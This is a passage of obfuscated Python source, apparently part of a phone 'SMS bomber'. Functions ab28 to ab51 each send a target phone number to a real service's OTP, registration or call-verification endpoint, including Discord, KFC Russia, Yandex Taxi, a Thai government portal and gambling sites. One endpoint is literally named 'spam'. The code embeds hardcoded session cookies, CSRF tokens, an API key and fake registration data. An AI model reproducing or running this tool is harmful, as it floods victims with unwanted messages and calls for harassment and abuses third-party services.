    post ("https://login.s-momclub.com/accounts.otp.sendCode",data =f"phoneNumber=%2B66{O0OOO0O0O00OOOOOO[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers ={"content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie":"gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})#line:245:post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
def ab28 (O000OOO00OO0O0OOO ):#line:247:def ab28(phone):
    post ("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json ={"username":f"{O000OOO00OO0O0OOO}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})#line:248:post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
def ab29 (O0OOO00OO0OOOO0O0 ):#line:250:def ab29(phone):
    post ("https://www.homepro.co.th/service/user/profile/otp.jsp",data =f"action=otp&user_mobile_number={O0OOO00OO0OOOO0O0}",headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token":"AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type":"application/x-www-form-urlencoded; charset=UTF-8","cookie":"h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"})#line:251:post("https://www.homepro.co.th/service/user/profile/otp.jsp", data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"})
def ab30 (OOO000OOOO000000O ):#line:253:def ab30(phone):
    post ("https://www.vegas77slots.com/auth/send_otp",data =f"phone={OOO000OOOO000000O}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers ={"content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie":"vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})#line:254:post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})
def ab31 (OO00OOO0O0000O000 ):#line:256:def ab31(phone):
    post ("https://www.kickoff28.com/action.php?mode=PreRegister",data ={"tel":f"{OO00OOO0O0000O000}"},headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})#line:257:post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
def ab32 (O00O0O000OOOOO0O0 ):#line:259:def ab32(phone):
    post ("https://1ufabet.com/_ajax_/request-otp",data ={"request_otp[phoneNumber]":f"{O00O0O000OOOOO0O0}","request_otp[termAndCondition]":"1","request_otp[_token]":"XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"},headers ={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})#line:260:post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
def ab33 (OO0000O0OO0OOOO0O ):#line:262:def ab33(phone):
    post ("https://findclone.ru/register?phone={phone}")#line:263:post("https://findclone.ru/register?phone={phone}")
def ab34 (O0O0O00O00000O0O0 ):#line:265:def ab34(phone):
    post ("https://gettgo.com/sessions/otp_for_sign_up",data ={"mobile":f"{O0O0O00O00000O0O0}"})#line:266:post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile":f"{phone}"})
def ab35 (O00000O0O00O0OO0O ):#line:268:def ab35(phone):
    post ("https://api.dgashopqr.morchana.in.th/logins",headers ={"User-Agent":useragent },data ={"phone":O00000O0O00O0OO0O })#line:269:post("https://api.dgashopqr.morchana.in.th/logins", headers={"User-Agent": useragent}, data={"phone": phone})
def ab36 (OOO0O00OOO00OO00O ):#line:271:def ab36(phone):
    post ("https://taxi.yandex.kz/3.0/launch/",data ={'phone':f"{OOO0O00OOO00OO00O}"})#line:272:post("https://taxi.yandex.kz/3.0/launch/", data = {'phone': f"{phone}"})
def ab37 (O0O0O0OOOOO0OOOOO ):#line:274:def ab37(phone):
    post ("https://api.baccaratth.com/api/v1/sendotp",data ={'phone_number':f"{O0O0O0OOOOO0OOOOO}"})#line:275:post("https://api.baccaratth.com/api/v1/sendotp", data = {'phone_number': f"{phone}"})
def ab38 (O000O000OOO0000O0 ):#line:277:def ab38(phone):
    OOO0OO00OO0O0OO0O =Session ()#line:278:send = Session()
    OOO0OO00OO0O0OO0O .headers .update ({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type":"application/x-www-form-urlencoded","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})#line:279:send.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    OOO0O0OOOOO0000O0 =OOO0OO00OO0O0OO0O .post ("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data =f"st.r.phone=+66{O000O000OOO0000O0[1:]}")#line:280:snd = send.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    OOOOOO00O0OO0OO0O =OOO0OO00OO0O0OO0O .post ("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data ="st.r.fieldAcceptCallUIButton=Call")#line:281:sed = send.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
def ab39 (OO000O00OO00O0O00 ):#line:283:def ab39(phone):
    post (f"https://www.konglor888.com/api/otp/register",data =f'applicant={OO000O00OO00O0O00}&serviceName=KONGLOR888',headers ={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with':'XMLHttpRequest','accept-language':'en-US,en;q=0.9','x-frame-options':'SAMEORIGIN','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41','accept-encoding':'gzip, deflate, br','accept':'*/*','cookie':'s%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'})#line:293:})
def ab40 (OO0OOOOO00OOOOOOO ):#line:295:def ab40(phone):
            post (f"https://api.ufaz88regis.com/api/getOtp",data =f'phone={OO0OOOOO00OOOOOOO}&aff_link=1%24abWbahhDXS1',headers ={'accept':'*/*','accept-encoding':'gzip, deflate, br','accept-language':'en-US,en;q=0.9','content-length':'41','content-type':'application/x-www-form-urlencoded; charset=UTF-8','sec-ch-ua-mobile':'?0','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-site','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67'})#line:307:})
def ab41 (OOOOOOO0O0OOOO0O0 ):#line:309:def ab41(phone):
    post ("https://nuubi.herokuapp.com/api/spam/alodok",data ={'number':f"{OOOOOOO0O0OOOO0O0}"})#line:310:post("https://nuubi.herokuapp.com/api/spam/alodok", data = {'number': f"{phone}"})
def ab42 (OOO0OO00000000O0O ):#line:312:def ab42(phone):
    post ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",data ={'cellphone':f"{OOO0OO00000000O0O}"})#line:313:post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data = {'cellphone': f"{phone}"})
def ab43 (OO000O00000OOO0O0 ):#line:315:def ab43(phone):
    post ("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",data ={'phone':f"{OO000O00000OOO0O0}"})#line:316:post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", data = {'phone': f"{phone}"})
def ab44 (OOO00000OOOO00OOO ):#line:318:def ab44(phone):
    post ("https://discord.com/api/v9/auth/register/phone",headers ={"Host":"discord.com","user-agent":"Discord-Android/105013","cookie":"__sdcfduid=608d2eac694211ec997a42010a0a0a4cd23801e46be73b7cba2279670205f0eb934ffd2384782ecb8a365045135a8998; __dcfduid=608d2eac694211ec997a42010a0a0a4c"},json ={"phone":"+66"+OOO00000OOOO00OOO })#line:319:post("https://discord.com/api/v9/auth/register/phone",headers={"Host": "discord.com","user-agent":"Discord-Android/105013","cookie":"__sdcfduid=608d2eac694211ec997a42010a0a0a4cd23801e46be73b7cba2279670205f0eb934ffd2384782ecb8a365045135a8998; __dcfduid=608d2eac694211ec997a42010a0a0a4c"},json={"phone":"+66"+phone})
def ab45 (O000O0000OO000OOO ):#line:321:def ab45(phone):
    post ("https://www.theconcert.com/rest/request-otp",json ={"mobile":O000O0000OO000OOO ,"country_code":"TH","lang":"th","channel":"call","digit":4 },headers ={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie":"_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})#line:322:post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
def ab46 (O00000000O00O00OO ):#line:324:def ab46(phone):
    post ("https://topping.truemoveh.com/api/get_request_otp",headers ={"Host":"topping.truemoveh.com","Accept":"application/json, text/plain, */*","cookie":"ci_session=frg153b1565dsuk4a8j55ile0902e8u2; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7863332B6DE108B97A74D16825A56218B56313DF605583F8CFFAC1507ED9FF78442B7C5D94C36D821689BAE3CE4EC4F5C66C3BEDE3A956835803CB9788CEEC93509; _gcl_au=1.1.464540432.1641184005; _ga=GA1.2.1183136403.1641184006; _gid=GA1.2.76253869.1641184006; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A98%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=c9b4000d-9f83-4aab-84a0-b85d22625f97; _fbp=fb.1.1641184007759.1727343609; wisepops_visits=%5B%222022-01-03T04%3A29%3A31.442Z%22%2C%222022-01-03T04%3A26%3A45.335Z%22%5D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; hPack_mbno=BbcI6g6x7hKHnTiL6HXixjC98Jf0SGbV6RcIB2YXt6i7BMLlXVlN14AiyGDjVKswHjmfv6kQ43NpuAPx%2FF5SsQ%3D%3D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-03T04%3A29%3A31.442Z%22%2C%22mtime%22%3A1641184218938%2C%22pageviews%22%3A5%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%7D%2C%22testIp%22%3Anull%7D","Referer":"https://topping.truemoveh.com/otp","User-Agent":"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36"},data ={"mobile_number":O00000000O00O00OO })#line:325:post("https://topping.truemoveh.com/api/get_request_otp",headers={"Host": "topping.truemoveh.com","Accept":"application/json, text/plain, */*","cookie":"ci_session=frg153b1565dsuk4a8j55ile0902e8u2; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7863332B6DE108B97A74D16825A56218B56313DF605583F8CFFAC1507ED9FF78442B7C5D94C36D821689BAE3CE4EC4F5C66C3BEDE3A956835803CB9788CEEC93509; _gcl_au=1.1.464540432.1641184005; _ga=GA1.2.1183136403.1641184006; _gid=GA1.2.76253869.1641184006; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A98%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=c9b4000d-9f83-4aab-84a0-b85d22625f97; _fbp=fb.1.1641184007759.1727343609; wisepops_visits=%5B%222022-01-03T04%3A29%3A31.442Z%22%2C%222022-01-03T04%3A26%3A45.335Z%22%5D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; hPack_mbno=BbcI6g6x7hKHnTiL6HXixjC98Jf0SGbV6RcIB2YXt6i7BMLlXVlN14AiyGDjVKswHjmfv6kQ43NpuAPx%2FF5SsQ%3D%3D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-03T04%3A29%3A31.442Z%22%2C%22mtime%22%3A1641184218938%2C%22pageviews%22%3A5%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%7D%2C%22testIp%22%3Anull%7D","Referer":"https://topping.truemoveh.com/otp","User-Agent":"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36"},data={"mobile_number": phone})
def ab47 (O0O0O00OOO00O0OO0 ):#line:327:def ab47(phone):
	OO00000000O0OOOO0 ={"content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","referer":"https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone","cookie":"_gcl_au=1.1.1123274548.1637746846"}#line:333:}
	post ("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers =OO00000000O0OOOO0 ,data =f"phoneno={O0O0O00OOO00O0OO0}&retrycount=0")#line:334:post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
def ab48 (OOO000O000O0O000O ):#line:336:def ab48(phone):
	post ("https://api.true-shopping.com/customer/api/request-activate/mobile_no",data ={'username':f"{OOO000O000O0O000O}"})#line:337:post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={'username': f"{phone}"})
def ab49 (OOOOOO00OOOO0O0O0 ):#line:339:def ab49(phone):
	post ("https://www.msport1688.com/auth/send_otp",data ={'phone':f"{OOOOOO00OOOO0O0O0}"})#line:340:post("https://www.msport1688.com/auth/send_otp", data={'phone': f"{phone}"})
def ab50 (O0000000O000OO0O0 ):#line:342:def ab50(phone):
	post ("https://ipro356.com/wp-content/themes/hello-elementor/modules/index.php",data =f"method=wpRegisterotp&otp_tel={O0000000O000OO0O0}",headers ={"content-type":"application/x-www-form-urlencoded; charset=UTF-8","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie":"PHPSESSID=vtacuje1no166kkp4d40nolak5"})#line:343:post("https://ipro356.com/wp-content/themes/hello-elementor/modules/index.php",data=f"method=wpRegisterotp&otp_tel={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "PHPSESSID=vtacuje1no166kkp4d40nolak5"})
def ab51 (O00OO0OO0OOOOO0O0 ):#line:345:def ab51(phone):
	post ("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",headers ={"User-Agent":"Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest","Cookie":"sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data =f"dCard=1358231116147&Mobile={O00OO0OO0OOOOO0O0}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")#line:346:post("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
def ab52 (O000OOOO0000OO0OO ):#line:348:def ab52(phone):
